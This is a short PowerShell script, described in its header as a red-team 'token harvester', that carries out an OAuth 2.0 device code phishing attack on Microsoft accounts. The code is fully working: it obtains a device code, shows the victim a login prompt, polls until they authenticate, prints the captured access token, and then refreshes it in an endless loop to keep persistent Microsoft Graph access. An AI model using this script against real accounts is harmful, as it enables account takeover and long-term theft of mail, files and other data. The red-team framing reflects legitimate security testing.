<#
.SYNOPSIS
  Device Code Flow Token Harvester 

.DESCRIPTION
  This PowerShell script simulates an OAuth 2.0 Device Code Flow attack. 
  It initiates a device code request to Microsoft’s authorization endpoint 
  and instructs the user to manually authenticate. Meanwhile, the script 
  enters a polling loop — acting as a covert interpreter — silently watching 
  for successful authorization. Once granted, it immediately captures the access 
  token and begins a persistent refresh loop, maintaining long-term Graph API access. 

  This script demonstrates how attackers can weaponize polling as a live 
  interpreter between user actions and backend token capture, converting 
  a legitimate flow into an abuse vector for red team operations or security testing.

.AUTHOR: Elli Shlomo
#>

#--------------------------

$token=Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" `
-Body @{client_id="04b07795-8ddb-461a-bbee-02f9e1bf7b46";scope="https://graph.microsoft.com/.default offline_access"}; `
Write-Host "Go to $($token.verification_uri) and enter $($token.user_code)"; `
$access=$null; while (-not $access) { Start-Sleep -Seconds 5; `
    try { $access=Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
    -Body @{client_id="04b07795-8ddb-461a-bbee-02f9e1bf7b46";grant_type="urn:ietf:params:oauth:grant-type:device_code";device_code=$token.device_code} `
    -ErrorAction Stop } catch {} }; Write-Host "Access Token: $($access.access_token)"; while ($true) { Start-Sleep -Seconds 3500; $access=Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
    -Body @{client_id="04b07795-8ddb-461a-bbee-02f9e1bf7b46";`
    grant_type="refresh_token";refresh_token=$access.refresh_token;scope="https://graph.microsoft.com/.default"}; `
    Write-Host "New Access Token: $($access.access_token)" }
